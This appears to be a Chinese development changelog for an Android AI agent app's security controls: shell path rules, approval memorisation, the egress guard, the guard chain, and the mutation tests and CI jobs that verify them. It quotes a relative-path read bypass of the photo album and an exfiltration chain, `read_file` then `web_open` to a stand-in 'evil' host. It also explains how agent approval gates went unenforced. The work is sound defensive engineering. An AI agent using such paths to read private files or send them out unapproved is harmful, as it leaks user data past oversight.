## 1. 改了什么

### 1.1 shell 相对路径绕过（安全，最高优先级）

**问题**：`cat ../../../../../../sdcard/DCIM/a.jpg` 不含绝对路径 token，三道判据
（只读白名单 / 绝对路径 / 保护根）全部落空 → 零弹窗读相册。
原注释把错误假设写死了：「相对路径落在 cwd 里，不构成绕过」。

**改法**（`core/agent/ShellCommandRules.kt:198-277`（判定体在 `:225-277`））：

- `sensitiveReadRoot(command, cwd = "/")` 增加 cwd 参数；
- 默认 `"/"` 是**故意取的最坏情况**：把相对路径当从根出发，`../../sdcard/x` 折成 `/sdcard/x` 命中；
- 顺序跟踪 `cd` / `pushd`：`cd /sdcard && cat DCIM/a.jpg` 的第二段按 `/sdcard` 解析；
- 路径 token 从 `argv[1]` 起算——`argv[0]` 是命令名，否则 `cat` 会被解析成 `/sdcard/cat`；
- 相对路径解析失败（含 `$` / `~` / `cd -`）保持原基准，不乱猜。

**已知边界**：工作区被显式绑定到 `/sdcard` 时，`cat DCIM/a.jpg` 这种既无 `..` 也非绝对的
路径无法静态判定（函数拿不到真实 cwd）；这一档由「用户主动绑定工作区」背书。

### 1.2 可记忆的外发通道（安全）

**问题**：`ApprovalScope.kt:139` 对非 shell 工具默认 `memorizable = true`，
`github_commit`（`Approval.GIT_WRITE`）因此可被「始终允许」永久放行。
`read_file → commit → push` 构成零弹窗外发链——与 11-17 补 `web_*` 是同一类。

**改法**：

- `ApprovalScope.EGRESS_GROUPS = { GROUP_NETWORK, GROUP_GIT_WRITE }`（`core/agent/ApprovalScope.kt:62-84`（常量在 `:77`））；
- `ChatViewModel.requestApproval` 的 `egressNow` 判定改为 `group in EGRESS_GROUPS`；
- 效果：本回合读过私有内容后，`github_commit` 走**同一次弹窗**，但降级为不可记忆、绕过 AUTO 档白名单。

**为什么不加进 `EgressGuard.DEFAULT_EGRESS_TOOLS`**：那会弹两个框。守卫管「没审批的通道」，
审批层管「有审批但记得住的动作」——分工写在 `EgressGuard` 的注释里了。

### 1.3 落盘截断标记（数据完整性）

**问题**：`ConversationStore.MAX_FIELD_CHARS = 4000` 静默 `take(4000)`，
重启后看到半截回答，与「模型真的只说了这么多」无法区分；冷启动续跑基于残文继续推理。

**改法**：

- `MsgRecord.truncatedChars: Int = 0`（被丢弃的字符数，旧文件默认 0）；
- 写入侧三处 `truncatedChars + droppedChars(x)`——用累加而不是覆盖，
  否则「读回 → 重写」一次就把标记抹掉；
- `UiItem.User/Assistant/Tool` 各加 `truncatedChars`（默认 0，构造点零改动）；
- 读取侧两条路径都传递（`MsgRecord.toUiItem` 与 `ConversationRecord.toUiItems`）；
- 助手气泡底部渲染一行：「正文已截断：原文 N 字符，落盘只存前 M 字符」（`ChatScreen.kt`）。

**没做**：正文外置（`<turnId>.tool.jsonl`）。先把「知道自己被截断」这件事做到，
外置是下一步，不急。

### 1.4 动作回执（设备操控）

**问题**：`ui_tap` 返回 `"已在 (x, y) 点击"`，只证明事件注入成功，不证明界面响应。
模型多一次 LLM 往返才发现没生效，还可能重复点同一个无效坐标。

**改法**（`app/automation/UiAutomationTools.kt:48-133`）：

- `uiFingerprint()`：无障碍树 JSON 的哈希，零截图、零模型；
- `awaitScreenChange()`：80ms 轮询到变化或 600ms 超时；
- `runOnService` 统一加回执——覆盖 `ui_tap` / `ui_long_press` / `ui_swipe` / `ui_input` / `ui_key` 五个工具；
- 没变化时返回 `ok=true` + `code="<ok>_no_effect"` + hint（「别重复点同一位置，先 ui_tree 确认」），
  不冒充失败——复选框这类树上看不出的状态变化会误报，提示比报错合适。

**已知边界**：页面有动画 / 倒计时文本时指纹持续变化，表现为**漏报**（少一句提示），
不会误报。误报的代价（诱导模型重试）比漏报大。

## 3. 第二轮（同日晚）：让这批修复不再靠「人记得」

第一轮的四项修复有一个共同弱点：**它们的价值完全取决于「有人改回去时 CI 会不会红」**。
而实测答案是「不会」——150 个脚本里 129 个只有文本断言，删掉实现照样绿。
所以这一轮只做一件事：把审批判定的判别力从「grep 匹配」变成「JVM 断言 + 变异验证」。

### 3.1 授权 TTL（`app/ui/ApprovalWhitelistStore.kt`）

修的是「本次会话」在手机上等于「永久」：会话可以挂几天，`github_commit`、按域名记住的
`http_request` 一旦被勾过就再也不过人。

实现上没有改任何调用点——`sessionAllowed += key` / `grant.key in sessionAllowed` 照旧，
把 `ConcurrentHashMap.newKeySet()` 换成 `AbstractMutableSet` 的过期实现（键 → 到期时刻）：

| 行为 | 改前 | 改后 |
|---|---|---|
| 刚批准 | 命中 | 命中 |
| 29 分钟后 | 命中 | 命中 |
| 31 分钟后 | **命中** | 不命中，重新弹窗 |
| 再次点「始终允许」 | 无变化 | 从这一刻重新计时 |
| App 升级 | 进程重启即失效 | 同（无需额外做「升级失效」） |

30 分钟是拍的，取值理由写在常量注释里（长于一次装依赖→编译→测试，短于「明天再说」）。

### 3.2 把读边界与档位判定迁到 JUnit

harness 里那 33 条行为断言要靠现拼 kotlinc 才能跑，缺编译器就整段 SKIP——
「绿得没有内容」正是这种。现在同样用例（A/B/C/D/E 五组，**31 条**）在
`core/src/test/.../ShellCommandRulesTest.kt`，不存在环境不具备这条路。

顺带补了一条 harness 没有的：`C5 不可记忆的授权写进白名单也不命中`——
白名单是可变集合，任何一处「顺手 add」都能塞进不可记忆的键，`allows` 必须自己再判一次。

第三轮又加了两组：

- `ApprovalTierTest`（**9 条**）：三档 × 高低风险 × 白名单有无的 12 个格子，
  外加 `AUTO_ALLOW_GROUPS` 不含 shell / app_manage / git_write / network 这条边界。
  它是「问不问」的唯一开关，每个格子的错误方向都是**单向的安全降级**（本该弹窗的静默放行），
  而此前只有一句 `grep 'STRICT -> false'` 兜着——改成 `true` 照样绿。
- `ConversationTruncationTest`（**7 条**）：截断标记的累加语义。写这组测试时当场抓到一个
  真实缺陷——助手的 `reasoning` 会被 `take(4000)` 截断，但丢弃量只算了正文，
  于是「正文很短 + 思维链超长」的消息会显示「完整」。已修（`droppedChars(reasoning)`）。

### 3.3 变异门禁（`scripts/qa/mutation-gate.py`）

只做一件事：**把缺陷注入回去，看断言红不红**。每条变异登记「期望哪几条断言变红」，
少红一条即失败。当前 9 条，全部被精确捕获：

| 变异 | 结果 |
|---|---|
| M1 只认绝对路径（= P1-1 修前行为） | CAUGHT：A5b / A5c / A5d |
| M2 一切命令算只读 | CAUGHT：E1 |
| M3 一切命令可记忆（rm/重定向都能记住） | CAUGHT：D1 / D2 / D3 |
| M4 不可记忆的授权也能命中白名单 | CAUGHT：C5 |
| M5 STRICT 档失效（白名单在逐步确认下也放行） | CAUGHT：STRICT 任何组合都弹窗 |
| M6 AUTO 档全放行（连 shell 也不问） | CAUGHT：AUTO 高风险组仍按白名单判 |
| M7 STANDARD 档失效（未授权也放行） | CAUGHT：STANDARD 只看白名单 |
| M8 读回重写清零截断计数（第一版的真实 bug） | CAUGHT：读回重写不清零 |
| M9 推理过程截断不计数 | CAUGHT：多个被截断字段 |

变异按「最小编译闭包」分两组（approval 9 个源文件 / storage 11 个），
一次只重编自己那条链，跑完 9 条约 2 分钟。故意不以 `run-` 开头，
避免被 `run-all.sh` 的通配收进每轮全量；接 CI 时单独一个 job。

> 为什么只覆盖审批判定：变异测试的前提是「有 30 秒内能跑完的真断言」。
> 给 grep 型断言做变异只会得到噪声——把实现删掉，grep 匹配的仍是注释里的名字。

### 3.4 接进 CI（`.github/workflows/build.yml`）

在 `Make gradlew executable` 之后加一个 step：

```yaml
- name: "Unit tests (core: 审批与读边界判定)"
  run: ./gradlew :core:testDebugUnitTest :app:testDebugUnitTest --no-daemon --stacktrace
```

为什么单独 step 而不是并进 `assembleRelease`：失败信息能直接指到测试方法名。
代价是一次 daemon 启动（约 20 秒），换来「测试挂了就不打包」。

> 这一条是**唯一没有本地验证过**的改动：沙箱没有 Android SDK，`./gradlew` 跑不起来。
> 40 条断言是用 Gradle 自带的 Kotlin 编译器直编 9 个源文件 + JUnitCore 验的，
> 与 gradle 的编译单元不完全等价。CI 第一次跑才是最终确认。

## 6. 第四轮（2026-11-19）：给「主文件坏了还能救回来」补断言

第三轮末尾把 `recoverFromShards()` 列为「唯一保障、零断言」。这轮把它钉住，过程中摸到
三个真缺陷——都不是新写的代码，是此前从未被走过的那条路上一直存在的。

### 6.1 三个缺陷

| 缺陷 | 现象 | 根因 |
|---|---|---|
| 索引记录文件名而非会话 id | 删除会话后，重启又「复活」；归档、去重按 id 找都对不上 | `recoverFromShards` 把 `safeStem(id)`（脏 id 会变成 `h-<hex>`）当成 id 写回索引，而内存用的是分片正文里的真实 id |
| 回退 `.bak` 后不修复主文件 | 每次启动都走一次回退；下一次写这个分片时，`AtomicJsonFile` 会把**坏的主文件**复制成 `.bak`，覆盖唯一好副本——那一刻再断电就真丢了 | 读路径只取值、不落盘 |
| 空分片目录每次都重扫 | 每次启动重读两个坏文件、重扫目录、打一条「索引不可用」 | `ids.isEmpty()` 时直接 return，不写空索引 |

UUID 场景下前两条永远不会暴露（stem 恰好等于 id），所以从 R-10 落地到现在的所有 harness
都是绿的。只有备份导入带来的脏 id（含 `/`、中文）才会分叉。

### 6.2 改法

- `recoverFromShards` 以**正文里的 id** 为准；读不出正文的分片退回 stem（文件还在，值得下次再试）
- 空目录也写一次空索引，一次性止血
- `.bak` 回退逻辑统一收进 `AtomicJsonFile.readWithBackupOrNull(healBackup = true)`：
  `healBackup` 专门处理「回退成功后原子写回」，且内部 `keepBackup = false`——
  否则自愈动作本身就会把好备份覆盖成坏主文件
- `isValid` 参数排在最后：它是唯一的函数类型参数，调用方一律写尾 lambda；排在布尔参数前面会编译失败

### 6.3 验到了什么

| 验证 | 结果 |
|---|---|
| `ConversationShardRecoveryTest`（11 条） | 全过：索引丢失 / 双双损坏 / 单分片回退 / 自愈 / 部分损坏 / 空目录 / 脏 id 不逃逸 / 真实 id 入索引 / messages 现算 / 删除不复活 / v2 索引 |
| `run-r10-shard-verification.sh` | 27 通过 / 0 失败（含 B7 分片回退、B13 扫目录重建） |
| `run-arch-guard-verification.sh` | 7 通过 / 0 失败 |
| 变异门禁 | 12 条全部 CAUGHT，新增 M10（索引写 stem）/ M11（去掉自愈）/ M12（有效性判定形同虚设） |
| JVM 单测合计 | approval 40 + storage 18 |

### 6.4 顺手补上的环境自举

这轮验证又踩了一次「没有 Android SDK 时怎么拿到 kotlinc」：手工软链 `/tmp/kc/lib`、
漏 `annotations` 导致 K2 后端崩成 `NoClassDefFoundError: NotNull`。已固化进 `deps.sh`：

- `qa_kotlinc()`：PATH → `KOTLINC_HOME` → Gradle 缓存，最后一档现造包装脚本
  （stdlib 显式拼进 `-cp`，coroutines 进编译器 classpath），按依赖集合指纹缓存
- `qa_stdlib()`：运行时 classpath 用的 stdlib（编译器找得到 ≠ `java -cp` 找得到）

实测：移走 `/tmp/kotlinc`、`KOTLINC_HOME` 指向不存在目录、只留 Gradle 缓存，
`run-r10-shard-verification.sh` 仍 27/0。其余 42 个脚本仍走老路径，可逐个切换。

## 7. 第五轮（2026-11-19 晚）：变异门禁进 CI + 工具目录断言

### 7.1 门禁不再允许「空跑算过」

`mutation-gate.py` 缺构件时原本 `return 0`——本地开发这样是对的，但接进 CI 就会造出
一个「什么都没跑却显示绿色」的 job。新增 `--strict`：打印缺件原因并退出 1。

CI 侧的 `mutation-gate` job 不复用 build 的 Gradle 缓存（那要先跑 gradlew，需要 Android SDK
与 5 分钟），直接下官方 kotlinc 发行版（1.9.25，与 `build.gradle.kts` 同版本）加 Maven 上的
junit / serialization 运行时，实测 1m47s。版本刻意对齐：用 2.x 编 1.9 源码虽然能过，
但 K1/K2 的推断差异会让「变异是否被捕获」的结论与真实构建脱节。

### 7.2 工具目录与审批归组（`ToolCatalogTest`，12 条）

`ToolCatalog` 是「加一个工具改哪几处」的单一真源，但它自己没有任何运行时守卫：
`audit()` 只打告警，`capabilityOf` 的 fail-closed 兜底是一行代码。钉住四件事：

| 断言 | 防的是什么 |
|---|---|

## 8. 第六轮（2026-11-19）：把「读过私有内容后不可记忆」搬出 ViewModel

### 8.1 这条链原来没有任何 JVM 断言

`requestApproval` 里有这么一段：

```kotlin
val egressNow = egressGuard.taintedNow && group in ApprovalScope.EGRESS_GROUPS
val grant = if (egressNow) scope.copy(memorizable = false, label = …) else scope
```

它是 lethal trifecta 的**第三道闸**（私有数据 + 不可信内容 + 外发通道同 ctx）。前两道都有断言：
`EgressGuard` 有 D1–D7、`ShellCommandRules` 有 A/B/C/D/E 五组。唯独这一道——因为长在
`ChatViewModel`（Android 类）里——JVM 编不了，唯一的覆盖是行为段 harness 里的**源码扫描**，
而 harness 在 CI 上是 SKIP。

判据边的三种错法，每一种都不会编译失败：

| 错法 | 后果 | 用户感知 |
|---|---|---|
| 完全不降级 | `read_file → http_request` 复用上周的域名授权，零弹窗外发 | 无 |
| 一刀切降级 | 所有审批都变「每次问」，一天点几十次之后开始闭眼点 | 烦，然后彻底失效 |
| 降级但换了 key | 干净回合里点过的「始终允许」也记不住，域名记忆整段废掉 | 每次都问，以为是 bug |

### 8.2 改法

`ApprovalScope` 新增两个纯函数，ViewModel 只负责注入 `taintedNow`：

- `isEgressTurn(toolName, taintedNow)`：决定是否**绕过全部免打扰通道**（档位、白名单、截图回合缓存）
- `effectiveGrant(toolName, args, taintedNow)`：决定这次授权**能不能被记住**

两者共用同一个 `groupOf`，注释里写明了为什么必须同源：各算一次的话，改了一处没改另一处，
表现是「弹窗照弹，但没点它就过了」。

第三个决定：**本来就不可记忆的档直接返回**。`rm -rf`、提权 shell、MCP 工具已经每次问，
再叠一句「本回合读过私有内容」只是让同一个命令在不同回合显示不同类别名。

### 8.3 验到了什么

`EgressDowngradeTest` 14 条：未污染时维持原判（网络 / GitHub）、污染后降级（网络 / GitHub / 换域名）、
**不降级**（普通 shell / 文件写入）、幂等（本就不可记忆的不重复加提示）、文案说明原因、
key 不变、降级后不命中旧白名单、判据与降级同源、`EGRESS_GROUPS` 只含外发组、
两个外发工具**真的**归到外发组（防改名后判定永远 false）。

| 验证 | 结果 |
|---|---|
| JUnit（approval 组） | **66 条全过**（原 52 + 新 14） |
| 变异门禁 | **19/19 CAUGHT**（M16 永不降级 / M17 一刀切 / M18 只改文案 / M19 换 key） |
| CI 同版本编译器（Kotlin 1.9.25，空 Gradle 缓存） | 19/19 CAUGHT，2m25s |

M18（只改文案不改 `memorizable`）值得单独记一笔：它让弹窗写着「本回合读过私有内容」，
用户照样能点「始终允许」并写进白名单。这是最像修好了的假修，改前没有任何东西会红。

### 8.4 顺手修的门禁自身缺陷

原来的变异方式是「改工作区原文件 → 编译 → `finally` 恢复」。`finally` 挡不住 SIGKILL：
`timeout` 杀进程、Ctrl-C 按两下、CI 取消 job，都会把变异**留在工作区**。而且它留下的是一种
最坏的脏——注入的缺陷看起来是正常代码，下一轮 commit 顺手推上去，门禁照样全绿
（断言本来就是对着变异版本写的），直到真机上那条防护失效才被发现。

现在变异写在临时副本上，编译器通过 `overrides` 用副本替换真实路径（包名由文件里的
`package` 声明决定，与目录结构无关），工作区零改动。实测跑动中 `git status` 不再出现
被变异的源文件。

### 8.5 仍然没做

|---|---|

| 其余 42 个硬编码 `/tmp/kotlinc` 的脚本 | 要从「永远 SKIP」变成真跑，需要先有 Gradle 产物（`CLASSES`），得单独设计 job |

## 9. 第七轮（2026-11-19）：守卫链的四条安全性质

`ToolGuardChain` 的全部安全性质都写在 KDoc 里，**没有一条能靠源码扫描证明**：

| 性质 | 写错的后果 |
|---|---|
| 崩溃 = 拒绝 | 改成 `catch { Abstain }` 就是静默放权，且装得越多越危险 |
| 超时 = 拒绝 | 一次卡死让整回合停在一步，用户只看到「卡住了」 |
| 首个 Deny 即终止 | 后面的守卫能「推翻」拒绝，链不再单调递减 |
| 取消要穿透 | 用户点停止，界面显示「工具执行失败」——这类假错误会让人反复重试 |

改前只有行为段 D7 覆盖了「用各自 timeoutMs」一条，而行为段在 CI 上是 SKIP。

### 9.1 `ToolGuardChainTest`（13 条）

空链弃权、全弃权=放行、首个拒绝终止且**后续守卫不被询问**（计数器）、拒绝**原样透传**（`code` 是模型的学习信号，包一层它就永远看不到真实原因）、抛 `Exception` 按拒绝、抛 `Error` 按拒绝（`catch (e: Exception)` 会漏掉 `NoClassDefFoundError` / `StackOverflowError`——那恰恰是最常见的烂守卫形态）、崩溃文案带守卫序号、崩溃后不继续问、超时按拒绝、**用各自 timeoutMs**（文案里要出现 `100ms` 而不是 `3000ms`）、未覆盖时继承默认值、取消穿透、弃权与拒绝混合按序判定。

### 9.2 超时用例的诚实边界

生产上真正的坏守卫是「内部跑阻塞 IO、不响应挂起取消」。那种情况在 JVM 上**测不出来**：`Thread.sleep` 占住唯一的事件循环线程，`withTimeoutOrNull` 自己也调度不上。所以只证明了「超时会被判成拒绝」，没有假装证明了「阻塞守卫也能被打断」。这句话写进了测试类的 KDoc，避免下次有人以为覆盖完整了。

### 9.3 验证

| 项 | 结果 |
|---|---|
| JUnit（approval 组） | **79 条全过**（66 + 13） |
| 变异门禁 | **23/23 CAUGHT**：M20 崩溃当弃权 / M21 取消被兜成拒绝 / M22 忽略各自超时 / M23 拒绝被丢弃 |
| CI 同版本编译器（1.9.25，空 Gradle 缓存） | 23/23 CAUGHT |

M23 值得记一笔：它把 `return decision` 删掉。每个守卫都跑过了，日志里也有拒绝记录，**工具照样执行**——从外部看，系统「有守卫」，只是不生效。

### 9.4 顺带

`find_classpath` 的运行时 classpath 补上 `coroutines`。它原来只在编译器 classpath 上，而 `ToolGuardChainTest` 里 `runBlocking` / `delay` 是被测代码的一部分，缺了会在 JUnit 阶段报 `NoClassDefFoundError`——看起来像测试写错了。

### 9.5 CI 上暴露的真问题：跨版本 jar 串档

`_glob_jar` 原来是「把所有 pattern 的结果混在一起排序取最后一个」。当 `/tmp/gcache`（Kotlin 2.2 生态）
与 kotlinc 发行版（1.9）两档并存时，字典序让 gcache 永远胜出：1.9 编译器读到元数据 2.2 的
coroutines，报 `module was compiled with an incompatible version of Kotlin`——错误文本以
jar 路径开头，被截断到 90 字符后看起来像「文件不存在」。本地（2.2 编译器 + gcache）一切正常，
CI 上 M20–M23 全 INVALID。

改成按 pattern 顺序取第一个命中，并过滤目录（原来 `_glob_jar` 不过滤 `isfile`）。
顺带补两处：

- `KOTLINC_HOME/lib/kotlinx-coroutines-core-jvm*.jar`——官方发行版自带，CI 走这一档；
- coroutines 同时进运行时 classpath——`runBlocking` / `delay` 是被测代码的一部分，
  只在编译器 classpath 上会让 JUnit 报 `NoClassDefFoundError`。

这条值得单独记：它不是断言的问题，是门禁自身解析环境的问题，**本地全绿、CI 全红**。
如果不接 CI，这个缺陷会一直在。

## 10. 第八轮（2026-11-19）：动作回执拆出 Android 依赖

`runOnService` 里的动作回执（执行后等界面变化，没变就把结果码降级为 `<okCode>_no_effect`）
此前与 `AgentAccessibilityService` 写在同一处，JVM 一行都跑不了，只能上真机点。

它恰恰是最容易写反的一段，两个方向的错法代价相反：

| 错法 | 后果 |
|---|---|
| 超时当「已变化」（`?: true`） | 模型以为点击生效，实际被弹窗挡住。它不会再试，任务在无人知晓处断掉 |
| 界面变了也判没变（`while (true)`） | 模型开始重复点同一位置，可能触发两次提交 |
| 去掉 `delay` | 忙等烧满主线程；而且忙等循环没有挂起点，`withTimeoutOrNull` 检测不到超时，**函数永远不返回** |

### 10.1 拆法

新建 `ScreenChangeReceipt.kt`（纯 Kotlin，不 import 任何 `android.*`），把判定收成一个
只认 `sense: () -> Int` 的函数；`UiAutomationTools` 只留「怎么取指纹」：

```kotlin
awaitFingerprintChange(before) { svc.uiFingerprint() }
```

常量 `SCREEN_CHANGE_TIMEOUT_MS` / `POLL_MS` 与 `NO_EFFECT_HINT` 一并搬过去，文案与常量同源。

### 10.2 `ScreenChangeReceiptTest`（11 条）

立即变化（且只取一次指纹）、第 N 次才变、一直不变超时返回 false、**轮询有间隔**、
零窗口不取指纹、负窗口按零、异常向上传播、异常不等超时、取消不变成 false、
默认常量 600/80、文案与常量一致。

### 10.3 一个测试设计上的坑

「去掉 `delay`」这种变异会让函数进入**没有挂起点的死循环**——`withTimeoutOrNull` 自己
也调度不上，测试不会红，而是**永远挂着**，CI 卡在那条 job 上直到超时。

所以每条用例都给 `sense` 加了调用次数上限（超限主动抛 `AssertionError`），并给
`@Test` 加 `timeout`。变异 M26 因此表现为「红」，而不是「卡住」。

这也是为什么这里用真实 `delay` 而不是 `kotlinx-coroutines-test` 的虚拟时间：虚拟时间会把
`delay` 变成立刻返回，正好把「忙等」这个变异测没。

### 10.4 验证

| 项 | 结果 |
|---|---|
| JUnit | approval 79 + storage 18 + automation 11 + app 5 |
| 变异门禁 | **27/27 CAUGHT**：M24 超时当已变化 / M25 不退出轮询 / M26 忙等 / M27 零窗口当已变化 |
| 门禁新增 `automation` 组 | 只编 2 个文件，比审批组（20+ 文件）快一个量级 |

### 10.5 仍然没做

`runOnService` 本身（降级分支、shizuku 兜底、取消不重发）仍无 JVM 断言——它依赖
`AgentAccessibilityService` 与 `AutomationBridge`。能测的判定已经拆出来了，剩下的是装配，
只能靠真机或 Robolectric（项目当前没有后者）。

## 11. 第九轮（2026-11-19）：本地全量第一次做到 FAIL=0

在此之前，「本地跑一遍全量」这件事没有可信结果：`PASS=64 SKIP=52 FAIL=33`，
而 33 个 FAIL 里大部分不是产品问题，是**依赖解析与环境缺失混在一起**。这一轮把它们分开，
顺带挖出一个我上一轮自己引入的真缺陷。

### 11.1 真缺陷：审批白名单没登记进 AppGraph

`ApprovalWhitelistStore`（第二/三轮为「本次会话始终允许」+ 30 分钟 TTL 而新建）有可变状态，
但没写进 `AppGraph`。后果不是编译错，而是 `resetAll()` **不会清它**：

> 切账号 / 清空数据之后，上一份身份的「始终允许」还在 30 分钟窗口里。

`run-appgraph-verification.sh` 的 B4 是双向对账（源码里每个带可变状态的 object ⇄ 清单），
它当场报了出来。修法是补 `ApprovalWhitelistStore.reset()`（`resetForTest` 改为它的别名）
并加一条登记，同时把 A1 的条数断言 30 → 31。

这条值得记：清单机制的价值恰恰在于「我加了个 object，它不知道」——如果没有这份对账，
这个泄漏会一直存在，而且没有任何现象。

### 11.2 依赖解析：四种「静默失败」

全量 FAIL 的根因归并成四类，每一类的报错都不指向真实原因：

| 症状 | 真因 | 修法 |
|---|---|---|
| `FATAL: 缺少 /tmp/w7-jars/…-1.6.3.jar` | 12 个脚本把兜底路径写成某个历史会话里手工放的 jar，**完全不看 Gradle 缓存** | 改成「环境变量 → Gradle 缓存（精确到 1.6.3 子目录）→ 遗留路径」三级 |
| `plugin classpath entry points to a non-existent location:` | 缓存命中了编译器与序列化库、但**没有插件**，于是整个回落块被跳过，`-Xplugin` 拿到空串 | 把 `-z "$SER_PLUGIN"` 加进回落条件 |
| `NoClassDefFoundError: …ExpressionCodegenExtension` | 插件来自缓存（1.9.25），编译器来自 `KOTLINC_HOME`（2.2.21）——**插件必须跟编译器走** | 先查 `$(dirname $KOTLINC_BIN)/../lib`，再退缓存 |
| `NoClassDefFoundError: kotlin/jvm/functions/Function0` | `find "$KC/lib"` 里 `$KC/lib` 是**软链**，find 对作为起点的软链不下降，`STD` 为空，`java -cp "$OUT:$COROUTINES:"` 缺 stdlib | 改用 `qa_stdlib`（`test -f` 天然穿透软链），退回 `find -L` |

第三条是上一轮「跨版本 jar 串档」的同一个坑换了个位置：**只要「谁提供编译器」和
「谁提供插件」是两次独立解析，就一定会漂移**。

### 11.3 环境缺 awk 会让静态断言给出**错误的**安全结论

沙箱的 `/usr/bin/awk` 断链（只有 `mawk`）。20 多个脚本的 `code_has` 用 awk 实现，
awk 不存在 → 返回 127 → 在 `if code_has …` 里等价于 false，于是打出：

```
FAIL  A8 宿主没有检查 needsApprovalFor —— 外部调用会绕过审批
```

一条**具体且错误**的安全结论。它会让人去修一个不存在的漏洞，比不跑更费时间
（实际源码里 `tool.needsApprovalFor(args)` 一直在）。补上 awk 链接后，`run-mcp-host`
从 30/6 变成 36/0。

因此 `run-all.sh` 新增环境自检：缺 `awk/sed/grep` 时打 `ENV MISSING tools:…`，
`gate.sh` 见到它就把整轮判为**不可信**——与 `ENV STALE` 同一套逻辑：
结论不可信的时候，绿和红都不能采信。

### 11.4 断言跟进入口改名（r08 G1）

第六轮把 `ApprovalScope.of(...)` 收敛成 `effectiveGrant(...)`（降级与授权键同一处算）。
`run-r08-verification.sh` 的 G1 绑定在旧函数名上，于是产品变强了、断言变红了。

改法：G1 认**任一**求值入口；另外新增 G1b 直接盯「授权键不是按组名拼的」——
那才是这条断言真正要防的东西（`rm -rf` 与 `ls` 共用一张票）。

|---|---|---|
| PASS | 64 | **111** |
| SKIP | 52 | 38 |
| FAIL | 33 | **0** |

`gate.sh` 六条全过（`known-broken` 0 条、无 XPASS、149 个 runner 全覆盖、

### 11.6 顺带：变异门禁自己也需要 trove / 同形态插件

这一轮把 `mutation-gate.py` 的构件解析补了两处，都是「报错完全不指向真因」的类型：

| 症状 | 真因 |
|---|---|
| `NoClassDefFoundError: gnu/trove/THashMap`，且错误首行是 `Tool.kt:167)` | 1.9.x 的 `kotlin-compiler-embeddable` 在运行时需要 trove4j；发行版的 `lib/` 自带，Gradle 缓存里在 `org.jetbrains.intellij.deps` 下 |
| `KotlinFrontEndException: Front-end Internal error: Failed to analyze declaration` | 插件来自 `KOTLINC_HOME`（2.x），编译器来自缓存（1.9.25） |
| `NoSuchMethodError: KtClassLikeInfo.getScopeAnchor()` | 插件是**发行版形态**、编译器是 **embeddable 形态**——两者的内部 API 不同 |

第三条最隐蔽：`kotlinc/lib/kotlinx-serialization-compiler-plugin.jar` 与 Maven 上的
`kotlin-serialization-compiler-plugin-embeddable-1.9.25.jar` 不是同一个东西，
前者依赖完整的 IntelliJ 平台类。**编译器与插件必须是同一种形态、同一版本**。

于是 `find_classpath` 现在按「缓存（embeddable 形态）→ `KOTLINC_HOME/lib`」取插件，
并把 trove4j 拼进编译器 classpath。本地验证：approval 组 79 tests OK，27 条变异全 CAUGHT。

### 11.7 CI 首跑：两个 job 都绿（第一次拿到真结果）

这一轮推送后等到了完整结果（run `44408089079`，commit `9ecd97f`）：

| job | 结论 | 关键 step |
|---|---|---|

## 12. 第十轮（2026-11-19）：出站守卫的四条通道从来没生效过

上一轮把「本地全绿 + CI 全绿」第一次做成事实。这一轮做的第一件事，是把**最危险那道闸**
的断言从「一条通道」扩到「整个集合」——扩的过程中发现了比断言本身更重要的东西。

### 12.1 缺陷：分支顺序让 4/5 条外发通道静默失效

`EgressGuard.check` 原来的形状是：

```kotlin
if (name in sensitiveTools) { taint(); return Abstain }   // ← 先返回
if (name !in egressTools) return Abstain
if (!tainted.get()) return Abstain
...
```

而 `web_open` / `web_eval` / `web_click` / `web_type` 这四个名字**同时**在
`DEFAULT_SENSITIVE_TOOLS` 与 `DEFAULT_EGRESS_TOOLS` 里（它们既能把页面内容带进来，
也能把内容带出去）。于是第一行就 return 了，外发分支永远轮不到它们。

净效果：`read_file → web_open("https://evil/?d=" + 内容)` 全程零弹窗，而
**2026-11-17 专门为这四个工具写的那段注释仍然躺在源码里**，写着「比 `web_search`
那条更静默」。读代码的人不会怀疑它没有实现。五条通道里真正生效的只有 `web_search`。

### 12.2 为什么一直没被发现：断言只走了 `web_search`

`run-agent-seams-verification.sh` 的 D1–D7 是真的行为断言（编译守卫、构造 context、
断言 Deny/Abstain），而且一直全绿。但 D1–D7 的每一次调用都用 `web_search`：

| 断言 | 覆盖面 |
|---|---|
| D1 无来源搜索放行且不打扰 | `web_search` |
| D2 读过文件后外发拒绝 | `web_search` |
| D3 用户同意后放行 | `web_search` |
| D4 新回合清账 | `web_search` |
| D5 不相干工具不标脏 | `web_search` |
| D6 / D7 超时上限 | 不涉及具体工具 |

> 有行为断言 ≠ 有判别力。D2 绿的时候，人读到的是「外发被拦住了」，
> 实际拦住的是**五分之一**，而且恰恰是最容易被注入利用的那四个（它们连搜索框都不出现）。

### 12.3 证据：用修复前的文件跑新断言

把 `HEAD` 版 `EgressGuard.kt` 放进变异门禁的 `overrides` 跑一遍新写的
`EgressGuardTest`（94 条中的 15 条是新增的）：

```
1) 双身份的外发工具一个都不能被敏感分支架空
   AssertionError: 这些工具读完私有内容后仍能外发（敏感分支提前返回把它架空了）：
   [web_open, web_eval, web_click, web_type]
2) 用户同意后放行且拿到原始参数
   AssertionError: expected:<1> but was:<0>          ← 压根没问过用户
3) 读过文件之后打开网页也会被拦下   AssertionError: ... 实际：GuardDecision$Abstain
4) 读过文件之后执行页面脚本也会被拦下 AssertionError: ... 实际：GuardDecision$Abstain
```

### 12.4 修法：判据用「进入前」，不用「当前」

```kotlin
val wasTainted = tainted.get()          // 进入本次调用之前
if (name in sensitiveTools) tainted.set(true)   // 标脏，但不再提前返回
if (name !in egressTools) return Abstain
if (!wasTainted) return Abstain
```

两条属性因此同时成立，且各自有一条断言钉住：

- **自己带进来的内容不拦自己**：干净回合里第一次 `web_open` 必须 Abstain（否则浏览网页
  要点一次「允许」，之后每次都要点）。
- **但会拦之后的外发**：`web_open` 之后再 `web_search` 必须 Deny（页面内容就是不可信内容）。

不修法之一：把那四个从敏感集合里删掉。它们确实把页面内容带进上下文，标脏是对的；
删掉就变成「读过网页之后外发不再降级」，另一条通道又漏了。

### 12.5 新断言（15 条）与变异（7 条）

`EgressGuardTest`（JVM，进 `mutation-gate` 的 approval 组，也随之进 CI 的 `:core:testDebugUnitTest`）：

| 组 | 条数 | 要点 |
|---|---|---|
| 读完再外发 | 4 | 单点三条 + **整个 `DEFAULT_EGRESS_TOOLS` 逐一过**（防「下次加工具」） |
| 干净回合不打扰 | 3 | 浏览/搜索不问用户；非外发工具不标脏 |
| 双身份 | 4 | 标脏但不拦自己；敏感集合逐一过；污染后继续读不被拦 |
